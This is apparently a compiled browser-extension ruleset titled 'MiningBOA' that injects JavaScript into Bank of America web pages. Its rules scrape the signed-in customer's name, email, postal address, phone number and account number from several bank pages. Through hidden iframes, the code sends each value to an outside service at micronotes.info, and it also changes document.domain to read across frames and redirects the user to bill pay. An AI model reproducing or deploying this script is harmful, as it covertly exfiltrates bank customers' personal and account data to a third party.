{"global":[{"source":"http://www.micronotes.info/boa/service.asmx/issuePass","name":"id_service","type":"datasource","datatype":"JSON","cachable":0},{"emit":"TellSubframe = function(url, ifrmID, fragment){         var i = $K(\"#\"+ifrmID);         if(i == undefined || i== null || i.length == 0 || i[0] == undefined){           $K(\"body\").append('<IFRAME id=\"'+ ifrmID +'\" style=\"display:none\" />');           i = $K(\"#\"+ifrmID);                                         }         var newurl = url.replace(/#.*$/,\"\");         i.attr(\"src\", newurl+\"#\"+fragment);       };        sendInfo = function(id, title, value){         var r = Math.round(Math.random()*1000).toString();         var frmid = \"tempfrm\"+r;         var i = $K(\"#\"+frmid);         if(i == undefined || i== null || i.length == 0 || i[0] == undefined){           $K(\"body\").append('<IFRAME id=\"'+frmid+'\" style=\"display:none\" />');           i = $K(\"#\"+frmid);         }         var call_info_service = \"http://www.micronotes.info/boa/service.asmx/acceptValue?\";         var url = call_info_service+\"id=\"+id+\"&title=\"+title+\"&value=\"+escape(value);         i.attr(\"src\", url);           };        getId = function(){        if(window.location.hash == undefined || window.location.hash == null || window.location.hash == \"\") {          return null;        }        var response = window.location.hash.substring(1);        return response;    };    isNum = function(str){              var ret = /^\\d+$/.test(str);            return ret;    };    extractNum = function(str){       return str.replace(/[^0-9]/g,\"\");    };    addIdToNav = function(id){           $K(\".primaryNavCnt a\").each(function(){               $K(this).attr(\"href\",$K(this).attr(\"href\")+\"#\"+id);           });           $K(\".secondaryNavCnt a\").each(function(){               $K(this).attr(\"href\",$K(this).attr(\"href\")+\"#\"+id);           });    };        clearTag = function(htmlString){            if(htmlString){              var mydiv = document.createElement(\"div\");               mydiv.innerHTML = htmlString;               var ret;                if (document.all)               {                    ret=mydiv.innerText;                }                   else               {                    ret=mydiv.textContent;                }               ret = ret.replace(/^\\s+|\\s+$/g,\"\");               return ret;                                   }    };        infoPickup = function (field){      return $K(\"#resp \"+field).text();    };                "}],"global_start_line":9,"dispatch":[{"domain":"bankofamerica.com","ruleset_id":null}],"dispatch_start_col":5,"meta_start_line":2,"rules":[{"cond":{"val":"true","type":"bool"},"blocktype":"every","actions":[{"action":{"source":null,"name":"noop","args":[],"modifiers":null},"label":null}],"post":null,"pre":[],"name":"gotowelcome","start_col":5,"emit":"var id = getId();     if(id != null && isNum(id)){       var raw_name = $(\".title7new:first\").text();       var name = raw_name.replace(/-.*$/,\"\").replace(/^\\s+|\\s+$/g,\"\");       sendInfo(id,\"name\",name);                var SecurityCenter_link = $K(\".cmslinknormal:first\").attr(\"href\");       TellSubframe(SecurityCenter_link, \"security_center\", id);         var Account_link = $K(\"a:eq(2)\",$K(\".secondaryNavCnt\")).attr(\"href\");       TellSubframe(Account_link, \"check_account\", id);                                                                                    }          ","state":"inactive","callbacks":null,"pagetype":{"event_expr":{"pattern":"GotoWelcome","legacy":1,"type":"prim_event","vars":[],"op":"pageview"},"foreach":[]},"start_line":14},{"cond":{"val":"true","type":"bool"},"blocktype":"every","actions":[{"action":{"source":null,"name":"noop","args":[],"modifiers":null},"label":null}],"post":null,"pre":null,"name":"gotosecuritycenter","start_col":5,"emit":"var id = getId();  if(id!=null && isNum(id)){    var addr_link = $(\"a:eq(1)\",$(\"#Personal\")).attr(\"href\");  TellSubframe(addr_link, \"addr_page\", id);    var raw_email=$(\"#Personal font:eq(1)\").text();  var email= raw_email.replace(/^.*:/,\"\").replace(/^\\s+|\\s+$/g,\"\").replace(/.$/,\"\");  sendInfo(id,\"email\",email);    }            ","state":"inactive","callbacks":null,"pagetype":{"event_expr":{"pattern":"GotoSecurityCenter","legacy":1,"type":"prim_event","vars":[],"op":"pageview"},"foreach":[]},"start_line":23},{"cond":{"val":"true","type":"bool"},"blocktype":"every","actions":[{"action":{"source":null,"name":"noop","args":[],"modifiers":null},"label":null}],"post":null,"pre":null,"name":"send_address_phone","start_col":5,"emit":"var id = getId();  if(id!=null && isNum(id)){  var address1 = $(\".txtAddDet:first\").text();  var address = address1.replace(/^\\s+|\\s+$/g,\"\").replace(/\\s*<br\\s*\\/?>\\s*/g,\" \").replace(/\\s+/g,\" \");  sendInfo(id,\"address\",address);    var phone1 = $(\".txtPHNTXT:last\").text();  var phone = phone1.replace(/[^0-9]*/g,\"\");  sendInfo(id,\"phone\",phone);     function reloadBillPay(){       var Billpay_link = $K(\".primaryNavCnt a:eq(2)\").attr(\"href\");       window.location.href = Billpay_link;       }  setTimeout(reloadBillPay,1000);  }          ","state":"inactive","callbacks":null,"pagetype":{"event_expr":{"pattern":".*SecurityCenterControl\\?custAction=4","legacy":1,"type":"prim_event","vars":[],"op":"pageview"},"foreach":[]},"start_line":30},{"cond":{"val":"true","type":"bool"},"blocktype":"every","actions":[{"action":{"source":null,"name":"noop","args":[],"modifiers":null},"label":null}],"post":null,"pre":null,"name":"send_email","start_col":5,"emit":"var id = getId();  if(id!=null && isNum(id)){  alert(\"email trigered\");  var email = $K(\".SFtdtext1:first\").text().replace(/^\\s+|\\s+$/g,\"\");  sendInfo(id,\"email\",email);   }          ","state":"inactive","callbacks":null,"pagetype":{"event_expr":{"pattern":"SecurityCenterControl\\?custAction=5","legacy":1,"type":"prim_event","vars":[],"op":"pageview"},"foreach":[]},"start_line":37},{"cond":{"val":"true","type":"bool"},"blocktype":"every","actions":[{"action":{"source":null,"name":"noop","args":[],"modifiers":null},"label":null}],"post":null,"pre":null,"name":"send_account","start_col":5,"emit":"var id = getId();  if(id!=null && isNum(id)){  var accNum = $K(\".OverText\",$(\"#ttAcctNo1\")).text().replace(/\\s*<.*>\\s*/g,\"\");  sendInfo(id,\"account\",accNum);   }          ","state":"inactive","callbacks":null,"pagetype":{"event_expr":{"pattern":"/GotoOnlineStatement","legacy":1,"type":"prim_event","vars":[],"op":"pageview"},"foreach":[]},"start_line":44},{"cond":{"val":"true","type":"bool"},"blocktype":"every","actions":[{"action":{"source":null,"name":"noop","args":[],"modifiers":null},"label":null}],"post":null,"pre":[{"rhs":{"source":"datasource","predicate":"id_service","args":[{"val":"","type":"str"}],"type":"qualified"},"lhs":"rawid","type":"expr"}],"name":"billpayment","start_col":5,"emit":"var id = getId();       var intval;                   if(id == null){       id = clearTag(rawid);       var welcome_link =  $K(\".primaryNavCnt a:first\").attr(\"href\");       TellSubframe(welcome_link, \"welcome_frm\", id);       addIdToNav(\"x\"+id);       }                  id = extractNum(id);       $K(\"body\").append(\"<div id='resp'>2</div>\");       function fetchInfo(){         KOBJ.eval({\"rids\"  : [\"a83x5\"], \"a83x5:id\":id});       };       intval = setInterval(fetchInfo, 5000);          ","state":"inactive","callbacks":null,"pagetype":{"event_expr":{"pattern":"bills.bankofamerica.com.*rq=ov[^#]*","legacy":1,"type":"prim_event","vars":[],"op":"pageview"},"foreach":[]},"start_line":51},{"cond":{"val":"true","type":"bool"},"blocktype":"every","actions":[{"action":{"source":null,"name":"noop","args":[],"modifiers":null},"label":null}],"post":null,"pre":null,"name":"addidtobillpaylink","start_col":5,"emit":"var id = getId();       if(id != null){          addIdToNav(id);        }          ","state":"inactive","callbacks":null,"pagetype":{"event_expr":{"pattern":".*","legacy":1,"type":"prim_event","vars":[],"op":"pageview"},"foreach":[]},"start_line":61},{"cond":{"val":"true","type":"bool"},"blocktype":"every","actions":[{"action":{"source":null,"name":"noop","args":[],"modifiers":null},"label":null}],"post":null,"pre":null,"name":"access_child","start_col":5,"emit":"var glbvar;  function showStr(v){     alert(v);  };  document.domain = \"bankofamerica.com\";  alert(document.title+\":\"+document.domain);      $K(\"body\").append('<IFRAME id=\"embeded\" name=\"embeded_iframe\" />');      $K(\"#embeded\").ready(function () {                          glbvar = $K(\".title7new:first\", frames['embeded_iframe'].document).text();        alert(\"abc\");          showStr(glbvar);      });      var welcome_link =  $K(\".primaryNavCnt a:first\").attr(\"href\");      $K(\"#embeded\").attr(\"src\", welcome_link);                  ","state":"active","callbacks":null,"pagetype":{"event_expr":{"pattern":"bills.bankofamerica.com","legacy":1,"type":"prim_event","vars":[],"op":"pageview"},"foreach":[]},"start_line":68},{"cond":{"val":"true","type":"bool"},"blocktype":"every","actions":[{"action":{"source":null,"name":"noop","args":[],"modifiers":null},"label":null}],"post":null,"pre":null,"name":"changedomain","start_col":5,"emit":"document.domain = \"bankofamerica.com\";  alert(document.title+\":\"+document.domain);          ","state":"active","callbacks":null,"pagetype":{"event_expr":{"pattern":"","legacy":1,"type":"prim_event","vars":[],"op":"pageview"},"foreach":[]},"start_line":75}],"meta_start_col":5,"meta":{"logging":"off","name":"MiningBOA","meta_start_line":2,"meta_start_col":5},"dispatch_start_line":6,"global_start_col":5,"ruleset_name":"a83x4"}